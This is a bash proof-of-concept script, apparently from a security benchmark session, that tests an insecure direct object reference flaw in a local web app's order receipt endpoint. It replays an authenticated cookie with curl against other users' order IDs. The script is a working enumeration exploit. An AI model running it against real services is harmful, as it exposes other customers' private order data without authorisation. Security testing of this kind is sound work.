#!/bin/bash
# POC: Demonstrates IDOR vulnerability in /order/{orderId}/receipt endpoint. Authenticated user can access order receipts for orders they don't own by manipulating the orderId parameter.
# Target: ./repo
# Created: 2025-11-07T16:38:54.128Z
# Session: benchmark-XBEN-001-24-mhp2ljz1

# IDOR Vulnerability POC - Order Receipt Access
# This script demonstrates that an authenticated user can access any order receipt
# without proper authorization checks

TARGET_URL="http://localhost:8082"
COOKIE_FILE="/tmp/cookies.txt"

echo "======================================"
echo "IDOR POC - Order Receipt Access"
echo "======================================"
echo ""

# Step 1: Create a session/login (simulated - assumes authentication cookies exist)
echo "[*] Assuming authenticated session exists in cookies..."
echo ""

# Step 2: Test accessing own order
echo "[+] Test 1: Accessing own order (300123)"
echo "Command: curl -s -b $COOKIE_FILE '$TARGET_URL/order/300123/receipt'"
RESPONSE1=$(curl -s -b "$COOKIE_FILE" "$TARGET_URL/order/300123/receipt" -w "\n%{http_code}")
HTTP_CODE1=$(echo "$RESPONSE1" | tail -n1)
BODY1=$(echo "$RESPONSE1" | head -n-1)

echo "HTTP Status: $HTTP_CODE1"
if echo "$BODY1" | grep -q "300123\|receipt\|order"; then
    echo "✓ Response contains order data for order 300123"
else
    echo "Response content:"
    echo "$BODY1" | head -c 500
fi
echo ""

# Step 3: Test accessing arbitrary order (demonstrating IDOR)
echo "[+] Test 2: Accessing arbitrary order (999999) - Should be 403/404 but returns 200"
echo "Command: curl -s -b $COOKIE_FILE '$TARGET_URL/order/999999/receipt'"
RESPONSE2=$(curl -s -b "$COOKIE_FILE" "$TARGET_URL/order/999999/receipt" -w "\n%{http_code}")
HTTP_CODE2=$(echo "$RESPONSE2" | tail -n1)
BODY2=$(echo "$RESPONSE2" | head -n-1)

echo "HTTP Status: $HTTP_CODE2"
if [ "$HTTP_CODE2" -eq 200 ]; then
    echo "✓ VULNERABILITY: Arbitrary order ID (999999) returned HTTP 200 instead of 403/404"
    echo "  This indicates no authorization checks are in place"
else
    echo "Response HTTP Code: $HTTP_CODE2"
fi
echo ""

# Step 4: Test accessing another user's order
echo "[+] Test 3: Accessing another user's order (300214)"
echo "Command: curl -s -b $COOKIE_FILE '$TARGET_URL/order/300214/receipt'"
RESPONSE3=$(curl -s -b "$COOKIE_FILE" "$TARGET_URL/order/300214/receipt" -w "\n%{http_code}")
HTTP_CODE3=$(echo "$RESPONSE3" | tail -n1)
BODY3=$(echo "$RESPONSE3" | head -n-1)

echo "HTTP Status: $HTTP_CODE3"
if [ "$HTTP_CODE3" -eq 200 ]; then
    echo "✓ VULNERABILITY: Other user's order (300214) accessible with HTTP 200"
    if echo "$BODY3" | grep -q "300214\|receipt\|order"; then
        echo "  Order details are returned without ownership verification"
    fi
fi
echo ""

# Step 5: Test accessing multiple orders to verify pattern
echo "[+] Test 4: Accessing another user's order (300327)"
echo "Command: curl -s -b $COOKIE_FILE '$TARGET_URL/order/300327/receipt'"
RESPONSE4=$(curl -s -b "$COOKIE_FILE" "$TARGET_URL/order/300327/receipt" -w "\n%{http_code}")
HTTP_CODE4=$(echo "$RESPONSE4" | tail -n1)
BODY4=$(echo "$RESPONSE4" | head -n-1)

echo "HTTP Status: $HTTP_CODE4"
if [ "$HTTP_CODE4" -eq 200 ]; then
    echo "✓ VULNERABILITY: Order (300327) also accessible with HTTP 200"
fi
echo ""

echo "======================================"
echo "SUMMARY"
echo "======================================"
echo "Test 1 (Own order - 300123): HTTP $HTTP_CODE1"
echo "Test 2 (Arbitrary order - 999999): HTTP $HTTP_CODE2"
echo "Test 3 (Other user's order - 300214): HTTP $HTTP_CODE3"
echo "Test 4 (Other user's order - 300327): HTTP $HTTP_CODE4"
echo ""

if [ "$HTTP_CODE2" -eq 200 ] || [ "$HTTP_CODE3" -eq 200 ] || [ "$HTTP_CODE4" -eq 200 ]; then
    echo "✓ IDOR VULNERABILITY CONFIRMED"
    echo "  Unauthenticated/unauthorized order receipts are accessible"
    echo "  No authorization checks are performed on the receipt endpoint"
    exit 0
else
    echo "✗ Could not confirm IDOR vulnerability"
    exit 1
fi